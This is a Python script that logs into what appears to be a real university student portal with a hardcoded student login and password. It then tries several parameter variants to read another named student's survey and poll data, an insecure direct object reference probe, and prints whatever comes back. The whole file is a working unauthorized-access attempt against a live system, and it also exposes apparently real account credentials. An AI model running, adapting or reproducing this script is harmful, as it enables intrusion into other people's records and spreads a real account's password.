import httpx
import asyncio
import json

BASE_URL = "https://student.jmcu.uz/rest/v1"
STUDENT_LOGIN = "395251101411"
STUDENT_PASS = "OshiqAli2623"

# Other student ID to test
OTHER_ID = 9358 # ULVI

async def probe():
    client = httpx.AsyncClient(verify=False, timeout=30.0)
    
    print("[-] Logging in as OshiqAli...")
    try:
        resp = await client.post(f"{BASE_URL}/auth/login", json={"login": STUDENT_LOGIN, "password": STUDENT_PASS})
        if resp.status_code == 200:
            token = resp.json().get("data", {}).get("token")
            print(f"    Got Token: {token[:10]}...")
            client.headers["Authorization"] = f"Bearer {token}"
            
            # Try to access OTHER student's survey
            print(f"[-] Probing Cross-Access for Student {OTHER_ID}...")
            
            attempts = [
                (f"{BASE_URL}/student/survey", {"student": OTHER_ID}),
                (f"{BASE_URL}/student/survey", {"_student": OTHER_ID}),
                (f"{BASE_URL}/student/survey", {"student_id": OTHER_ID}),
                (f"{BASE_URL}/data/poll-list", {"student_id": OTHER_ID}), # Student querying data?
            ]
            
            for url, params in attempts:
                print(f"    Requesting {url} with {params}...")
                r = await client.get(url, params=params)
                print(f"    Status: {r.status_code}")
                if r.status_code == 200:
                    print(f"    DATA: {r.json()}")
                    
        else:
            print(f"    [!] Login Failed: {resp.status_code}")
            
    except Exception as e:
        print(f"    [!] Error: {e}")

    await client.aclose()

if __name__ == "__main__":
    asyncio.run(probe())
